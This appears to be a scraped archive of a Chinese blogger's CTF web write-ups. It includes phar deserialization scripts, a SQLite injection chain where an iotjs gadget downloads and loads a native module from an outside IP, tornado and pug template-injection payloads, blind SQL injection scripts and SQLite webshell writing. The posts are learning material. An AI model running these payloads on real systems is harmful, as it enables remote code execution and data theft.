print(&quot;Sending exp to the server...&quot;)with open(&quot;get_flag.log&quot;, &quot;rb&quot;) as f: requests.post(&quot;http://xx/log.php?log_type=&quot; + generated_type, data=f.read().replace(generated_metadata, &quot;&quot;).replace(&quot;]\\n&quot;,&quot;&quot;)).text# getflagprint(&quot;Getflag!&quot;)print(requests.get(&quot;http://xx/index.php?file=phar://log/158.101.144.10/&quot; +generated_type + &quot;_www.log&quot;).text) 坑点说是坑点，其实也不算吧，就是生成时间戳的那个，在windows系统上不知道为啥执行不来，大概是没权限吧，所以我只能搬到服务器上去执行==，为啥这个时间戳这么重要呢？思考了一下，tar文件数据有比较严格的格式要求，而此时我们是将整个log文件作为一个tar文件，如果我们这个时间戳没有实时更新，那么我们构造以后写入的数据和现在重新生成的时间戳（也就是content前面的内容）拼接以后，就不是一个合法的tar文件格式了，举个例子：就好比，我在A构造好的东西，去了一半去和B构造好的拼接执行，尽管拼接位置一样，但是前后数据不是连贯一致的，所以需要实时更新时间戳才行。 官方wp这里直接N1的题解脚本了 &lt;?phpCLASS FLAG { //private $_flag; public function __destruct(){ echo &quot;FLAG: &quot; . $this-&gt;_flag; }}$ip = &quot;172.17.0.1&quot;;$log = 'Time: ' . date('Y-m-d H:i:s') . ' IP: [' . $ip . '], REQUEST: [], CONTENT: [';$data_len = strlen($log);if(!file_exists(&quot;./phar.tar&quot;)){ $phar = new PharData(dirname(__FILE__) . &quot;/phar.tar&quot;, 0, &quot;phartest&quot;, Phar::TAR); $phar-&gt;startBuffering(); $o = new FLAG(); $phar-&gt;setMetadata($o); $phar-&gt;addFromString($log, &quot;test&quot;); $phar-&gt;stopBuffering(); file_put_contents(&quot;./phar.tar&quot;, &quot;]\\n&quot;, FILE_APPEND);}$exp = file_get_contents(&quot;./phar.tar&quot;);$post_exp = substr($exp, $data_len);echo $post_exp;echo rawurlencode($post_exp); 这个是它的内容观察一下tar文件里面的情况 可以发现是文件名为log有点难受，复现到这里，发现环境关掉了，还好给了docker文件，在服务器上试试 接下来发过去即可 import osimport requestsfrom urllib.parse import unquotedef execCmd(cmd): r = os.popen(cmd) text = r.read() r.close() return textheaders = { &quot;X-Forwarded-For&quot;: &quot;110.42.133.120&quot;}# write evil log fileexp = execCmd(&quot;php exp.php&quot;)r = requests.post(&quot;http://110.42.133.120:8080/&quot;, unquote(exp), headers=headers)print(r.text)# expr = requests.get(&quot;http://110.42.133.120:8080/?log_type=test&amp;file=phar://./log/172.17.0.1/look_www.log&quot;)# r = requests.get(&quot;http://testabc.com:10082/?log_type=test&amp;file=phar://./log/127.0.0.1/phar.tar&quot;)print(r.text) 思路整理做这种题确实很爽，感觉思路有在被打开，虽然是看着wp艰难完成的。。。这里梳理一下1.题目很明显需要我们phar反序列化，但是由于写入的文件尾有脏字符，而phar对后四位的签名有规定，所以只能写入tar文件，很巧的是，两者更改后缀都没有影响，判断文件的标准是文件内容的数据，确定使用tar文件进行反序列化后，接下来就是构造数据包 2.了解tar的数据结构，构造出完整正确的tar压缩包传过去即可 思路看似很简单，但其实其中的坑是挺多的，很好！！！ funny_web&lt;?phpsession_start();//hint in /hint.txtif (!isset($_POST[&quot;url&quot;])) { highlight_file(__FILE__);}function uuid(){ $chars = md5(uniqid(mt_rand(), true)); $uuid = substr($chars, 0, 8) . '-' . substr($chars, 8, 4) . '-' . substr($chars, 12, 4) . '-' . substr($chars, 16, 4) . '-' . substr($chars, 20, 12); return $uuid;}function Check($url){ $blacklist = &quot;/l|g|[\\x01-\\x1f]|[\\x7f-\\xff]|['\\&quot;]/i&quot;; if (is_string($url) &amp;&amp; strlen($url) &lt; 4096 &amp;&amp; !preg_match($blacklist, $url)) { return true; } return false;}if (!isset($_SESSION[&quot;uuid&quot;])) { $_SESSION[&quot;uuid&quot;] = uuid();}echo $_SESSION[&quot;uuid&quot;].&quot;&lt;/br&gt;&quot;;if (Check($_POST[&quot;url&quot;])) { $url = escapeshellarg($_POST[&quot;url&quot;]); $cmd = &quot;/usr/bin/curl ${url} --output - -m 3 --connect-timeout 3&quot;; echo &quot;your command: &quot; . $cmd . &quot;&lt;/br&gt;&quot;; $res = shell_exec($cmd);} else { die(&quot;error~&quot;);}if (strpos($res, $_SESSION[&quot;uuid&quot;]) !== false) { echo $res;} else { echo &quot;you cannot get the result~&quot;;} 这边主要是有一个curl的trick，直接粘贴复制文档吧，没有环境 bypass url check：'fi[k-m]e:///hint.txt'bypass output check：'fi[k-m]e:///{hint.txt,7f7d9107-a48b-284e-a29e-66c871bf5706}' QQQueryyy_all_the_things继续来续坑了，感觉还是想把这里的题给复现一下，趁着周四下午没课，来做一下测试了一下，发现是sqlite数据库的注入：继续往下，查查看有没有能用的数据 sqlite查询语句select sqlite_version();select sql from sqlite_master;select sql from sqlite_master where type='';select sql from sqlite_master where type='' and name =''; 如果查出来的view，可以直接查询 CREATE VIEW view_p_sum (Product, P_SUM) ASSELECT Product, Price*Quantity FROM p_orders GROUP BY Product;##可以使用select * from view_p_sum 这里尝试写shell试试。。。但是很尴尬的是还不知道绝对路径 可以发现有很多表，尝试访问一下看看 继续探索，发现他们是来自于一个叫做osquery的东西，他是 是 SQL 驱动的分析和监控操作系统的工具，是操作系统分析框架。参考：https://www.lxlinux.net/4183.html发现他是可以命令执行的，所以我们继续查一下看看 他还有其他的表可以用来查询命令，而在这里有一份很详细的内容各个表以及可以查询的内容：https://osquery.io/schema/4.1.2#processes发现flag了但是这个读取不了内容就很难受了 再看看有没有其他读文件的操作？ 有发现一个curl指令，难道说要ssrf吗？先看看开放了什么端口吧 使用 ?str=';select * from listening_ports;' 可以发现有以下端口 {&quot;address&quot;:&quot;0.0.0.0&quot;,&quot;family&quot;:&quot;2&quot;,&quot;fd&quot;:&quot;-1&quot;,&quot;net_namespace&quot;:&quot;4026532416&quot;,&quot;path&quot;:&quot;&quot;,&quot;pid&quot;:&quot;-1&quot;,&quot;port&quot;:&quot;16324&quot;,&quot;protocol&quot;:&quot;6&quot;,&quot;socket&quot;:&quot;33536608&quot;}, {&quot;address&quot;:&quot;::&quot;,&quot;family&quot;:&quot;10&quot;,&quot;fd&quot;:&quot;-1&quot;,&quot;net_namespace&quot;:&quot;4026532416&quot;,&quot;path&quot;:&quot;&quot;,&quot;pid&quot;:&quot;-1&quot;,&quot;port&quot;:&quot;80&quot;,&quot;protocol&quot;:&quot;6&quot;,&quot;socket&quot;:&quot;33536329&quot;} ] 看到16324端口了，在看看其他服务 [ {&quot;''&quot;:&quot;&quot;}, {&quot;cmdline&quot;:&quot;/bin/sh /root/start.sh&quot;}, {&quot;cmdline&quot;:&quot;/usr/sbin/apache2 -k start&quot;}, {&quot;cmdline&quot;:&quot;/usr/sbin/apache2 -k start&quot;}, {&quot;cmdline&quot;:&quot;/usr/sbin/apache2 -k start&quot;}, {&quot;cmdline&quot;:&quot;/usr/sbin/apache2 -k start&quot;}, {&quot;cmdline&quot;:&quot;/usr/sbin/apache2 -k start&quot;}, {&quot;cmdline&quot;:&quot;/usr/sbin/apache2 -k start&quot;}, {&quot;cmdline&quot;:&quot;sh -c echo 'SELECT '\\\\'''\\\\'';select cmdline from processes;'\\\\'''\\\\'' as hello;' | osqueryi --json&quot;}, {&quot;cmdline&quot;:&quot;osqueryi --json&quot;}, {&quot;cmdline&quot;:&quot;sleep infinity&quot;}, {&quot;cmdline&quot;:&quot;/usr/sbin/xinetd -pidfile /run/xinetd.pid -stayalive -inetd_compat -inetd_ipv6&quot;}, {&quot;cmdline&quot;:&quot;/usr/sbin/apache2 -k start&quot;} ] 其中最可疑的应该就是”/usr/sbin/xinetd，所以我们顺着往下查查看，正好我们可以读文件 查阅了一下，原来xinetd是一个服务 xinetd即extended internet daemon，xinetd是新一代的网络守护进程服务程序，又叫超级Internet服务器。经常用来管理多种轻量级Internet服务。xinetd提供类似于inetd+tcp_wrapper的功能，但是更加强大和安全。 他的配置文件是存在/etc/xinetd.d/ 在这里发现了ctf的进程 {&quot;atime&quot;:&quot;1639034423&quot;,&quot;block_size&quot;:&quot;4096&quot;,&quot;btime&quot;:&quot;0&quot;,&quot;ctime&quot;:&quot;1639035944&quot;,&quot;device&quot;:&quot;0&quot;,&quot;directory&quot;:&quot;/etc/xinetd.d/&quot;,&quot;filename&quot;:&quot;ctf&quot;,&quot;gid&quot;:&quot;0&quot;,&quot;hard_links&quot;:&quot;1&quot;,&quot;inode&quot;:&quot;2101156&quot;,&quot;mode&quot;:&quot;0644&quot;,&quot;mtime&quot;:&quot;1639034423&quot;,&quot;path&quot;:&quot;/etc/xinetd.d/ctf&quot;,&quot;size&quot;:&quot;628&quot;,&quot;symlink&quot;:&quot;0&quot;,&quot;type&quot;:&quot;regular&quot;,&quot;uid&quot;:&quot;0&quot;}] 由于配置文件位于etc，所以我们可以使用linux中的配置编辑器augeas进行读取 Augeas基本上就是一个配置编辑工具。它以他们原生的格式解析配置文件并且将它们转换成树。配置的更改可以通过操作树来完成，并可以以原生配置文件格式保存配置。 但是augeas就无法读取其他文件了–，出题人设置的也是刚刚好呀 ?str=';select * from augeas where path = &quot;/etc/xinetd.d/ctf&quot;;' 发现这两个东西，虽然还不知道有啥用，但是先存着好了 /etc/xinetd.d/ctf&quot;,&quot;value&quot;:&quot;/src/iotjs/build/x86_64-linux/debug/bin/iotjs&quot;value&quot;:&quot;/src/iotjs/tools/repl.js&quot;}, 这边是有关于其的一个简介 iotjs 是三星开源的javascript 物联网开发平台。 它为javascript 应用程序提供了访问硬件、网络、文件系统和异步化的能力，功能类似于nodejs，但无论是代码体积还是内存需求，iotjs 都要小很多，是用javascript 开发iot 设备应用程序的首选。 他这边说了iotjs，大概就是要利用它进行一个rce了，but–接下来就是一个大大大的只是盲区了，大致就是iotjs可以恶意加载模块，我们传入一个恶意模块，让他去加载 如何编写一个新模块？这里看到的是使用一个工具协助进行编写，，，好麻烦我吐了 https://github.com/jerryscript-project/iotjs/blob/master/docs/devs/Writing-New-Module.mdhttps://github.com/jerryscript-project/iotjs/blob/master/docs/api/IoT.js-API-N-API.md x先留一个坑吧。。贴一下脚本 import requestsimport randomimport base64# SQL Injectionurl = &quot;http://47.57.246.66:12321/?str=world';{};--&quot;# Payload from other teampayload = &quot;select group_concat(result)from curl where url='http://127.0.0.1:16324' and user_agent='\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n{node}\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n'&quot;&quot;&quot;&quot;Write native module to serverfs = require(&quot;fs&quot;);http = require(&quot;http&quot;)f = fs.openSync(&quot;/tmp/styp.node&quot;, &quot;w&quot;)http.get({ host: &quot;158.101.144.10&quot;, port: 80, path: &quot;/styp.node?exp&quot;}, function(resp){ resp.on(&quot;data&quot;, function(exploit){ fs.writeSync(f, exploit, 0, exploit.length) }); resp.on(&quot;end&quot;, function(){ fs.closeSync(f) process.exit(1) });});&quot;&quot;&quot;gadget_init = &quot;fs=require(\\&quot;fs\\&quot;);f=fs.openSync(\\&quot;/tmp/styp.node\\&quot;,\\&quot;w\\&quot;);http=require(\\&quot;http\\&quot;);http.get({ host:\\&quot;158.101.144.10\\&quot;,port:80,path:\\&quot;/styp.node?q\\&quot;},function(r){r.on(\\&quot;data\\&quot;,function(c){fs.writeSync(f, nc, 0, c.length);});r.on(\\&quot;end\\&quot;, function(){fs.closeSync(f);process.exit(1);})});&quot;payload_init = payload.format(node=gadget_init)r = requests.get(url.format(payload_init))print(r.text)&quot;&quot;&quot;Run my native modulesty = require(&quot;/tmp/styp.node&quot;)console.log(sty)&quot;&quot;&quot;gadget_shell = &quot;sty=require(\\&quot;/tmp/styp.node\\&quot;);console.log(sty);&quot;payload_shell = payload.format(node=gadget_shell)r = requests.get(url.format(payload_shell))print(r.text) tornado在这个框架下的模板注入，但是我本地搭建不起来，所以直接研究一下payload吧他使用的是tornado的模板引擎 tornado的模板引擎不支持像’attr’这样的内置方法，它可以让我们通过拼接字符串绕过过滤器。但它公开了一个名为handler. 这个对象包含很多属性和方法。如果我们在这个对象上运行一个 DFS 算法，那么我们可以找到一个引用 的 dict 对象builtins。而这个对象的路径是handler.request.server_connection._serving_future._coro.cr_frame.f_builtins. {{handler.request.server_connection._serving_future._coro.cr_frame.f_builtins['ev'+'al']}}&gt;&gt;&gt; &lt;built-in function eval&gt; 无情的payload搬运工。。 {% autoescape request.server_connection._serving_future._coro.cr_frame.f_builtins['exe'+'c'] %}{{ request.headers[&quot;z&quot;] }} import requestspayload=&quot;&quot;&quot;{{% raw &quot;{}&quot; _tt_utf8 = handler.request.server_connection._serving_future._coro.cr_frame.f_builtins['ev'+'al']%}}{{% raw 1 _tt_utf8 = lambda x:x%}}&quot;&quot;&quot;.format(''.join(['\\\\x{:02x}'.format(ord(c)) for c in &quot;__import__('os').popen('/readflag').read()&quot;]))res = requests.post(&quot;http://127.0.0.1:5000/&quot;,data={'data':payload})print(res.text)","link":"/2021/12/08/2021nu1lctf/"},{"title":"2021深育杯","text":"weblog","link":"/2021/11/16/2021%E6%B7%B1%E8%82%B2%E6%9D%AF/"},{"title":"2021陇原抗疫","text":"eaaaasyphp一开始眼睛只看到hint了，疯狂试绕wakeup，发现没反应，才知道原来是php7.2版本的，要利用其他地方的类读bypass $a=new Esle();$b=new Bypass();$b-&gt;str4='phpinfo';$a-&gt;c=$b;echo serialize($a); 发现api服务是fastcgi，","link":"/2021/11/09/2021%E9%99%87%E5%8E%9F%E6%8A%97%E7%96%AB/"},{"title":"mysql8.0新特性深入详解","text":"前言最近打比赛遇到很多场都和mysql8.0有关的，然后看到网上关于这个知识点的文章也没有很多，于是决定好好总结一下。 环境配置本地一直用的就是mysql8.0，所以就没改了，然后题目的话直接使用sqlilabs靶场即可 tabletable是mysql新推出的一个查询功能，可以说是select的替代，虽然功能比select差点 TABLE table_name [ORDER BY column_name] [LIMIT number [OFFSET number]] eg:table users;table users order by usernametable users order by username limit 0,1; 可以发现table显示的是整个users表的内容它还可以添加参数，使得表数据的显示方式变得多元化一些 如果只需要某一行，还可以添加limit函数进行截取 实战：1.和union组合可以直接和union组合构成万能密码，在有回显的题目当中，也可以直接用来查表的数据，但是由于无法使用group_concat()所以只能利用limit，一个个截取得到 -1'union table users limit 0,1--+ 2.无列名盲注当题目过滤了select和常用的infor表时，我们可以使用table还有mysql.innodb_table_stats进行替换 table mysql.innodb_table_stats 此时我们即可查询得到表名 而在table中的盲注和普通的盲注不太一样，它是按位截取对比的","link":"/2021/11/07/2021%E9%A6%99%E5%B1%B1%E6%9D%AF/"},{"title":"bsides-ahmedabad-ctf-2021","text":"pugpug 根据大师傅的wp，这题是原型链污染，但是我没看出来，所以认为还是应该回去理解一下，什么情景下会造成原型链污染？ 原型链污染形成原因如果可以控制并修改一个对象的原型，那么将可以影响所有和对象来自同一个类、父、组类的对象 什么时候可以利用存在可控的对象键值 function merge(target, source) { for (let key in source) { if (key in source &amp;&amp; key in target) { merge(target[key], source[key]) } else { target[key] = source[key] } }} 分析参数传入将经过deparam进行处理 var input = deparam(req.originalUrl.slice(2)); 在deparam中存在原型链污染，主要在下面这段代码，如果你传入了一个数组，含有多个键，那么就会进入以下循环进行赋值，我们可以跟一下值来分析一下 keys_last = keys.length - 1; for ( ; i &lt;= keys_last; i++ ) { key = keys[i] === '' ? cur.length : keys[i]; console.log(key[i]); cur = cur[key] = i &lt; keys_last ? cur[key] || ( keys[i+1] &amp;&amp; isNaN( keys[i+1] ) ? {} : [] ) : val; } 可以看到keys的数组的值分成了三部分: 再往下继续调试此时key分为三部分，cur为含有所有键以及其值是一个对象，当key为constructor，他就会向上继承去获取其constructor的值 constructor属性的含义就是指向该对象的构造函数，所有函数（此时看成对象了）最终的构造函数都指向Function，而saasa是一个string，那么就是指向获得了一个string()，而所有函数的constructor都指向Function，也就是最原始的那个 而在这个Function()下面又有很多的函数，可以发现有一个正则表达式，也就是过滤我们字符的函数，我们可以通过污染这个正则表达式，来实现绕过，可以看到此时的三部分,cur[key]的值已经为那个正则表达式的内容了 最后直接将这个正则表达式赋值为我们传入的污染数据: 梳理一下代码逻辑：如果我们传入一个数组数据，那么他会递归取值并进行重新赋值，直到最后一个值被赋出 传入:test=aaa&amp;test[constructor][SafetifyRegExp]=ssss过程:cur={name:xxx,test:xxx}cur=cur[test]=&gt;cur=aaacur=cur[constructor]=&gt;aaa[constructor]=string()cur=cur[SafetifyRegExp]=&gt;string()[SafetifyRegExp]=正则表达式此时数组递归遍历结束，进行赋值string()[SafetifyRegExp]=ssss 模板注入接下来就是pug的模板注入了，想要直接getshell是没办法的因为他过滤得很严格而且我们无法绕过: const denylist = [&quot;%&quot;,&quot;(&quot;,&quot;global&quot;, &quot;process&quot;,&quot;mainModule&quot;,&quot;require&quot;,&quot;child_process&quot;,&quot;exec&quot;,&quot;\\&quot;&quot;,&quot;'&quot;,&quot;!&quot;,&quot;`&quot;,&quot;:&quot;,&quot;-&quot;,&quot;_&quot;]; 但是在/serverstatus中有命令执行，并且这里可以传入参数，即req，res，但是由于options.options写死了，导致这里的命令是执行不了的，因为直接timeout500了==，所以我们先接触他，然后再控制options.args实现命令执行 app.get('/serverstatus', (req, res) =&gt; { const result = child_process.spawnSync('ps' , options.args, options.options); out = result.stdout.toString(); res.send(out);}); 首先我们要让childe_process.spawnSync可以执行shell命令，所以需要打开这个模式，是要用url编码即可绕过:的过滤 %23{options.options.shell%3Dtrue} 接下来再对options.args进行重新赋值，利用name进行传参绕过引号过滤（无法像shell:true）直接传参的原因： ?name=cpu,args%20;cat%20/proc/self/environ&amp;content=%23{options.args%3D[options.args[0],name]} 最终可以发现执行命令为: ps -eo cpu,args;cat /proc/self/environ 由于是windows下复现的，就不演示了","link":"/2021/11/11/bsides-ahmedabad-ctf-2021-0/"},{"title":"","text":"前言最近都在用docker来复现题目，但是每次都忘记指令，所以来整理一下 docker build -t docker名字 -f docker路径 .例: docker build -t eaysphp -f ./Dockerfile . 运行docker docker run -itd -p 要映射的端口号（针对服务器而言）:docker里面的web服务端口 docker run -itd -p 8080:80 easyphp /bin/bash(这个有的时候要加) 进入docker docker ps 先看一下要进入的dockeriddocker exec -it docker的id bashdocker exec -it 5axxxx bash 一些报错 systmctl daemon-reloadservice docker restartservice docker status docker stop docker的id 遇到docker-compose.yaml直接在那个文件所在目录 docker-compose up","link":"/2021/11/25/docker%E5%9F%BA%E6%93%8D/"},{"title":"phar反序列化","text":"前言之前写过的关于phar的考点，但是忘记放在哪个博客了，以后命名还是不能以比赛题目命名呀。。。所以重新整理一下 phar触发函数 exif exif_thumbnail exif_imagetype gd imageloadfont imagecreatefrom*** hash hash_hmac_file hash_file hash_update_file md5_file sha1_file file / url get_meta_tags get_headers standard getimagesize getimagesizefromstringfinfo_file/finfo_buffer/mime_content_type","link":"/2021/11/23/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"title":"2021i春秋秋季个人赛","text":"前言和安洵杯冲了，在安洵杯没思路的时候去做了一下，就做了一下第一题 uname源码很简单，分为exists和upload两部分 &lt;?phpclass name1{ public $var; public function __destruct(){ echo $this-&gt;var; }}class name2{ public function __toString(){ $_POST[&quot;func&quot;](); return &quot;&quot;; }}header(&quot;Content-type: text/html;charset=utf-8&quot;);$ip=$_SERVER['REMOTE_ADDR'];$find_this = create_function(&quot;&quot;, 'die(`cat /flag`);');error_reporting(0);$filename = $_GET['filename'];if (!$_GET['ip']){ echo $ip;}if ($filename == NULL){ die();}if (file_exists($filename)){ echo '&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;该文件存在&quot;);&lt;/script&gt;';}else{ echo '&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;该文件不存在&quot;);&lt;/script&gt;';} 很明显是phar反序列化，file_exists触发，然后upload过滤了一系列内容，但是可以使用tar文件进行反序列化 &lt;?phpclass name1{ public $var; public function __destruct(){ echo $this-&gt;var; }}class name2{ public function __toString(){ $_POST[&quot;func&quot;](); return &quot;&quot;; }}$obj=new name1();$b=new name2();$obj-&gt;var=$b;@unlink(&quot;test.tar&quot;);$phar = new PharData(&quot;get_flag.tar&quot;);$phar[&quot;AAABshpik&quot;] = &quot;FLAGFLAGFLAG&quot;;$phar-&gt;setMetadata($obj); 然后改后缀为jpg就行了，但其实有个问题，这里不是对tar文件进行操作判断是否有那个字符了吗？ exec(&quot;tar -tf &quot;.$_FILES[&quot;file&quot;][&quot;tmp_name&quot;],$r_array);if(in_array(&quot;.phar/.metadata&quot;,$r_array)){ return false;}return true; 让我们测试一下 -t或–list 列出备份文件的内容，而这个tar的文件内容有两部分，他只检测了第一部分–，所以就轻而易举的绕过了然后后面在本地看一下文件名是什么，利用exists页面的$ip=$_SERVER[‘REMOTE_ADDR’];这个输出内容加上那个字符串经过md5解码一下就可以，然后完整目录是 /upload/xxxxx.gif 然后在exists页面使用phar协议进行访问 phar://./upload/xxx.gif 但是同时要传参，这里需要去执行那个create_function $find_this = create_function(&quot;&quot;, 'die(`cat /flag`);'); 网上有文章 代码很简洁粗暴，开头就创建了一个全局函数，可以查看flag。create_function生成的函数名有些特殊，它是NULL字符加上”lambda_”再加个一个数字标识（\\x00lambda_数字标识），其中数字标识代表它是当前进程中的第几个匿名函数。create_function的实现步骤如下：获取参数, 函数体拼凑一个”function __lambda_func (参数) { 函数体;} “的字符串eval之通过__lambda_func在函数表中找到eval后得到的函数体, 找不到就出错定义一个函数名:”\\000_lambda_” . count(anonymous_functions)++用新的函数名替换__lambda_func https://www.shawroot.cc/631.html 直接别人脚本跑就好了 import requestsi = 0while True: r = requests.get('http://471d0bad-6115-4107-a4ab-33cd2cb83b26.node4.buuoj.cn:81/?func_name=%00lambda_1') if 'flag' in r.text: print(r.text) break i += 1 print(i) 但是需要注意的是，这里是post请求，所以要改改 import requestsi = 0data={&quot;func&quot;:&quot;%00(这个%00进行url解码以后再发送过去)lambda_1&quot;}while True: r = requests.post('http://471d0bad-6115-4107-a4ab-33cd2cb83b26.node4.buuoj.cn:81/?filename=phar://./upload/xxxx.gif',) if 'flag' in r.text: print(r.text) break i += 1 print(i) 然后就可以拿到flag了 mimic-ssrf探测到7410是php的端口8888端口是go的端口8080是java 感觉是要读文件才能往下做，但是不知道啥能读文件 /proc/[pid]/cmdline 是一个只读文件，包含进程的完整命令行信息。如果该进程已经被交换出内存或者这个进程是 zombie 进程，则这个文件没有任何内容。该文件以空字符 null 而不是换行符作为结束标志。举例如下： 看了一下wp才发现原来还有这个， 当时在爆破目录的时候，就在想cmdline是什么，但是一时没想起来，哎，还是太年轻了，感觉得找个时间再好好总结一下，接下来就是去爆破读取一下，看看对应语言的源码 /web/java/jdk1.8.0_202/bin/java -Xdebug -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=20211 -jar /web/java/Hello_web.jar /web/python/app.py /web/golang/ssrf_go","link":"/2021/11/29/2021i%E6%98%A5%E7%A7%8B%E7%A7%8B%E5%AD%A3%E4%B8%AA%E4%BA%BA%E8%B5%9B/"},{"title":"2021安洵杯","text":"扫描 发现是是fastjson-1.2.47， JDK 1.3.1 easytp PD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQoZAQAAAQAAABEAAAABAAAAAADkAAAATzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czoyMToiAHRoaW5rXE1vZGVsAHdpdGhBdHRyIjthOjE6e3M6MToiYSI7czo2OiJzeXN0ZW0iO31zOjE3OiIAdGhpbmtcTW9kZWwAZGF0YSI7YToxOntzOjE6ImEiO3M6Njoid2hvYW1pIjt9fX19BwAAAGV4cC50eHQEAAAAE6ChYQQAAAAMfn/YtgEAAAAAAAB0ZXN0R8Un+dr04897mUVob2bLZdKmlRkCAAAAR0JNQg== PD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8DQoZAQAAAQAAABEAAAABAAAAAADkAAAATzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czoyMToiAHRoaW5rXE1vZGVsAHdpdGhBdHRyIjthOjE6e3M6MToiYSI7czo2OiJzeXN0ZW0iO31zOjE3OiIAdGhpbmtcTW9kZWwAZGF0YSI7YToxOntzOjE6ImEiO3M6Njoid2hvYW1pIjt9fX19BwAAAGV4cC50eHQEAAAAbLKhYQQAAAAMfn/YtgEAAAAAAAB0ZXN0X3PmDDRS4FHBGm6qipcoKSJ8JRECAAAAR0JNQg==PD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8DQoZAQAAAQAAABEAAAABAAAAAADkAAAATzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czoyMToiAHRoaW5rXE1vZGVsAHdpdGhBdHRyIjthOjE6e3M6MToiYSI7czo2OiJzeXN0ZW0iO31zOjE3OiIAdGhpbmtcTW9kZWwAZGF0YSI7YToxOntzOjE6ImEiO3M6Njoid2hvYW1pIjt9fX19BwAAAGV4cC50eHQEAAAAx6 hYQQAAAAMfn/YtgEAAAAAAAB0ZXN0FLfX2uY rTDjIvKfzYKxEr1rbNoCAAAAR0JNQg==PD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQoZAQAAAQAAABEAAAABAAAAAADkAAAATzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czoyMToiAHRoaW5rXE1vZGVsAHdpdGhBdHRyIjthOjE6e3M6MToiYSI7czo2OiJzeXN0ZW0iO31zOjE3OiIAdGhpbmtcTW9kZWwAZGF0YSI7YToxOntzOjE6ImEiO3M6Njoid2hvYW1pIjt9fX19BwAAAGV4cC50eHQEAAAAbLKhYQQAAAAMfn/YtgEAAAAAAAB0ZXN0X3PmDDRS4FHBGm6qipcoKSJ8JRECAAAAR0JNQg==","link":"/2021/11/27/2021%E5%AE%89%E6%B4%B5%E6%9D%AF/"},{"title":"2021NCTF","text":"ezsql格式化字符串漏洞,之前hack.lu做过payload是 password=1%1$') or 1=1#&amp;name=a NCTF{3v3ryth1ng_not_fantast1c_:)} 然后接下来就是常规的盲注了 password=1%1$') or substr(database(),1,1)&gt;0#&amp;name=a payload=f&quot;1%1$') or substr(({change_pa}),{i},1)&gt;{mid}#&quot; 表名：NcTF,users import requestsurl=&quot;http://129.211.173.64:3080/login.php&quot;s=requests.session()def sql_in(change_pa): database = &quot;&quot; for i in range(1,10000): low=0 high=264 mid = (low + high) // 2 while (low &lt; high): payload=f&quot;1%1$') or ascii(substr(({change_pa}),{i},1))&gt;{mid}#&quot; data={&quot;password&quot;:payload,&quot;name&quot;:&quot;a&quot;} r=s.post(url=url,data=data).text #print(data) #print(r) if &quot;NCTF{3v3ryth1&quot; in r: low=mid+1 else: high=mid mid=(low+high)//2 if (mid == 0 or mid == 264): break database += chr(mid) print(database)if __name__==&quot;__main__&quot;: #data=&quot;database()&quot; #data=&quot;select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()&quot; #data = 'select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x4e635446' data='select/**/`fl@g`/**/from/**/NcTF limit 1,1' #data=&quot;version()&quot; sql_in(data)","link":"/2021/11/29/2021NCTF/"},{"title":"sqlite数据库学习","text":"前言最近遇到蛮多sqlite数据库的，感觉也是mysql考烂了吧，所以这里来总结一下 sqlite使用指令解释 attach database 'a' as 'b';创建一个数据库文件a命名为b联系在当前使用的数据库下 创建数据库 sqlite3.exe 数据库名.db附加数据库的基本语法是：ATTACH DATABASE 'DatabaseName' As 'Alias-Name';。如果数据库尚未被创建，这个命令将创建一个数据库，如果数据库已存在，则把数据库文件名称与逻辑数据库 ‘Alias-Name’ 绑定在一起。例如附加一个bb.db的数据库，别名为a，命令为：attach database 'd:\\\\sqlite\\\\bb.db' as 'a';。 创建表并插入数据 create table a.tt(dataz text); INSERT into a.tt(dataz) VALUES ('test'); sqlite可以生成任意后缀的数据库文件例如创建一个php结尾的数据库文件，新建一个名为exp的表，并在其中插入数据，内容为：&lt;?php phpinfo();?&gt;。 具体命令如下： ATTACH DATABASE 'D:\\xxx\\www\\234.php' AS test2 ;create TABLE test2.exp (dataz text) ; insert INTO test2.exp (dataz) VALUES ('&lt;?php phpinfo();?&gt;');-- 测试了一下，发现竟然可以跨目录创建，那么就意味着我们可以创建任意文件，这也将为我们写shell构造了其他方法,前提是需要知道一个绝对路径 同样的方法生成aspx后缀的数据库文件，创建表，并插入&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%&gt;。然后将该文件放在IIS服务的web目录。发现其中的APSX代码也会被解析。 写shell时遇到特殊字符处理方法1.使用十六进制进行写入 2.SQLite中十六进制的写法为：x'....'，而不是0x....。 参考:https://fuping.site/2017/07/19/SQLite-Injection-Get-WebShell/ 查询指令sqlite中可以查询的数据库有 sqlite_master,sqlite_temp_master,sqlite_schema,sqlite_temp_schema select sqlite_version();select sql from 